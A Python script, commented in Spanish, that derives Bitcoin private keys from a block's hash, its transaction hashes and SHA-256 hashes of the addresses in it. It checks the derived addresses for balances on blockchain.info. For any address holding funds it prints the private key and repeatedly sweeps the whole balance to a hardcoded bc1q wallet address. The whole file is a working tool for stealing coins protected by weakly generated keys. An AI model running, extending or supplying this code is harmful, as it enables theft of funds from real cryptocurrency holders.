import hashlib
import requests
import time
from bitcoinx import (
    private_key_to_public_key,
    pubkey_to_bitcoin_address,
    btcPrivatekeyHextoWIF,
)

from bit import Key
from bit.network import NetworkAPI


# Función para enviar todos los fondos
def send_all_funds(privateKeyWIF, destination_address):
    # Crear una clave a partir de la clave privada en formato WIF
    key = Key(privateKeyWIF)

    while True:

        # Verificar el saldo disponible
        balance = key.get_balance('btc')
        print(f"Saldo disponible: {balance} BTC")
        
        try:
            # Asegurarse de que balance es un número flotante
            balance = float(balance)
        except ValueError:
            print("Error: El saldo no es un número válido.")
            return


        if balance <= 0:
            print("No hay fondos disponibles para enviar")
            break  # Sale del bucle while si se cumple la condición


        try:
            # Crear la transacción con la tarifa configurada
            tx = key.create_transaction([], leftover=destination_address, replace_by_fee=False, absolute_fee=True)

            # Verificar que la transacción fue exitosa
            if tx:
                print(f"Transacción creada con éxito: {tx}")
            else:
                print("No se pudo crear la transacción, sin detalles de la respuesta.")

        except Exception as e:
            print(f"Error al crear la transacción: {str(e)}")


        # Esperar 10 segundos antes de intentar nuevamente hasta que quede en 0 BTC
        time.sleep(10)



# Función para obtener el balance de una dirección usando la API de Blockchain.info
def obtener_balance_direccion(direcciones):
    """
    Obtiene el balance de varias direcciones usando la API de Blockchain.info.
    Las direcciones se pasan en lotes de 140 debido a las limitaciones de la API.

    :param direcciones: Lista de direcciones Bitcoin.
    :return: Diccionario con los balances de las direcciones.
    """
    # Asegúrate de que 'direcciones' es una lista
    if isinstance(direcciones, str):
        direcciones = direcciones.split(',')  # Convertir cadena separada por comas en lista


    # Agrupar direcciones en bloques de 140 para evitar superar los límites de la API
    balances = {}
    for i in range(0, len(direcciones), 140):
        batch = direcciones[i:i+140]

        # Unir las direcciones con '|' para la URL
        direcciones_unidas = '|'.join(batch)
        
        url = f"https://blockchain.info/balance?active={direcciones_unidas}"
        response = requests.get(url)
        
        if response.status_code == 200:
            data = response.json()
            balances.update(data)
        else:
            print(f"Error al obtener el balance para las direcciones: {direcciones_unidas}")
            print(f"Respuesta de la API: {response.text}")
        

        # Esperar 10 segundos antes de procesar el siguiente lote
        time.sleep(10)
    
    return balances



# Función para obtener la información de un bloque
def obtener_info_bloque(bloque_id):
    """
    Obtiene información del bloque usando la API de Blockchain.info, incluyendo el hash del bloque y los hashes de las transacciones.

    :param bloque_id: ID del bloque (número de bloque).
    :return: Diccionario con el hash del bloque y una lista de hashes de transacciones.
    """
    url = f"https://blockchain.info/block-height/{bloque_id}?format=json"
    response = requests.get(url)
    
    if response.status_code == 200:
        data = response.json()
        block_data = data['blocks'][0]
        block_hash = block_data['hash']
        tx_hashes = [tx['hash'] for tx in block_data['tx']]
        return block_hash, tx_hashes
    else:
        print("Error al obtener información del bloque")
        return None, []



# Función para generar direcciones y WIF
def generar_direcciones_y_wif(texto=None, isAddress=False):
    """
    Genera las direcciones Bitcoin (comprimida y sin comprimir) y sus WIFs a partir de un texto.

    :param texto: Cadena de texto base para generar el hash SHA-256.
    :param isAddress: Si es True, se genera una dirección; si es False, se genera una clave privada.
    :return: Diccionario con las direcciones y WIFs.
    """

    if texto is None:
        return False  # Si texto es None, devolvemos False

    if isAddress:
        # Generar el hash SHA-256 del texto
        hex_generate = hashlib.sha256(texto.encode()).hexdigest()
    else:
        # Usar el texto tal cual si isAddress es False
        hex_generate = texto


    # Convertir Hex a WIF (comprimida y sin comprimir)
    pk_wif_sin_comprimir, pk_wif_comprimida = btcPrivatekeyHextoWIF(hex_generate)
    
    # PrivateKey HEX to Pubkey (comprimida y sin comprimir)
    pubkey_sin_comprimir, pubkey_comprimida = private_key_to_public_key(hex_generate)
    
    # PubKey to Address (comprimida y sin comprimir)
    address_sin_comprimir = pubkey_to_bitcoin_address(pubkey_sin_comprimir)
    address_comprimida = pubkey_to_bitcoin_address(pubkey_comprimida)
    
    # Devolver los resultados en un diccionario
    return {
        "hash_hex": hex_generate,
        "wif_sin_comprimir": pk_wif_sin_comprimir,
        "wif_comprimida": pk_wif_comprimida,
        "direccion_sin_comprimir": address_sin_comprimir,
        "direccion_comprimida": address_comprimida,
    }


# Función para obtener direcciones de las transacciones
def obtener_direcciones_de_tx(tx_hash):
    """
    Obtiene las direcciones de un tx a partir del hash del tx usando la API de Blockchain.info.

    :param tx_hash: Hash de la transacción.
    :return: Lista de direcciones involucradas en la transacción.
    """
    url = f"https://blockchain.info/rawtx/{tx_hash}"
    response = requests.get(url)
    
    if response.status_code == 200:
        data = response.json()
        # Extraemos las direcciones de las entradas y salidas de la transacción
        direcciones = []
        for vin in data.get('inputs', []):
            if 'prev_out' in vin:
                direcciones.append(vin['prev_out'].get('addr'))
        for vout in data.get('out', []):
            direcciones.append(vout.get('addr'))
        return direcciones
    else:
        print(f"Error al obtener información de la transacción: {tx_hash}")
        return []



# Función para procesar un bloque y sus transacciones
def procesar_bloque_y_transacciones(bloque_id):
    """
    Procesa un bloque, extrae las direcciones de las transacciones y obtiene sus balances.

    :param bloque_id: ID del bloque (número de bloque).
    :return: None
    """
    # Obtener información del bloque
    block_hash, tx_hashes = obtener_info_bloque(bloque_id)
    if block_hash is None:
        return

    # Inicializamos un diccionario para almacenar las direcciones y sus WIFs
    direcciones_wif = {}

    # Convertir el hash del bloque en direcciones y agregar los WIFs al diccionario
    resultadoBlockhashToAddress = generar_direcciones_y_wif(block_hash, isAddress=False)

    # Verificar si la respuesta no es False antes de agregar las direcciones
    if resultadoBlockhashToAddress:
        # Asignamos solo el WIF correspondiente para cada dirección
        direcciones_wif[resultadoBlockhashToAddress['direccion_sin_comprimir']] = resultadoBlockhashToAddress['wif_sin_comprimir']
        direcciones_wif[resultadoBlockhashToAddress['direccion_comprimida']] = resultadoBlockhashToAddress['wif_comprimida']


    # Convertimos los hashes de las transacciones en direcciones y asignamos los WIFs
    for tx_hash in tx_hashes:
        resultadoTxToAddress = generar_direcciones_y_wif(tx_hash, isAddress=False)

        # Verificar si la respuesta no es False antes de agregar las direcciones
        if resultadoTxToAddress:
            # Asignamos solo el WIF correspondiente para cada dirección
            direcciones_wif[resultadoTxToAddress['direccion_sin_comprimir']] = resultadoTxToAddress['wif_sin_comprimir']
            direcciones_wif[resultadoTxToAddress['direccion_comprimida']] = resultadoTxToAddress['wif_comprimida']


    # Obtenemos las direcciones de las transacciones y les asignamos los WIFs
    for i, tx_hash in enumerate(tx_hashes):
        # Mostrar el número de transacciones restantes por procesar
        print(f"Procesando transacción {tx_hash}... ({i+1} de {len(tx_hashes)}) restantes.")
        
        # Retraso para no sobrecargar la API
        time.sleep(1)

        tx_direcciones = obtener_direcciones_de_tx(tx_hash)
        for addr in tx_direcciones:
            # Convertir la dirección y asignar solo el WIF correspondiente
            resultado = generar_direcciones_y_wif(addr, isAddress=True)

            if resultado:  # Verificamos que resultado no sea False
                # Asignamos solo el WIF correspondiente para cada dirección
                direcciones_wif[resultado['direccion_sin_comprimir']] = resultado['wif_sin_comprimir']
                direcciones_wif[resultado['direccion_comprimida']] = resultado['wif_comprimida']



    # Obtener balances de las direcciones (en grupos de 100)
    while len(direcciones_wif) > 0:

        # Convertir las direcciones a una cadena separada por comas
        direcciones_batch = ','.join(list(direcciones_wif.keys()))  # Direcciones separadas por coma

        # Llamar a la función para obtener el balance, pasando las direcciones como una cadena separada por coma
        balances = obtener_balance_direccion(direcciones_batch)

        # Imprimir las direcciones con balance
        for direccion, balance_data in balances.items():
            balance = balance_data.get('final_balance', 0)
            if balance > 0:
                # Obtenemos el WIF correspondiente para la dirección
                wif = direcciones_wif.get(direccion)
                
                if wif:
                    print(f"Dirección: {direccion}, Balance: {balance} satoshis, WIF: {wif}")
                    # Enviar todo el balance
                    send_all_funds(wif, 'bc1qmp3tj4gyjndqqlt20nu53ed9z7haa6z6wlckdc')


        # Eliminar las direcciones procesadas
        direcciones_wif = {k: v for k, v in direcciones_wif.items() if k not in direcciones_batch}



# Ejemplo de uso
bloque_id = 876398
procesar_bloque_y_transacciones(bloque_id)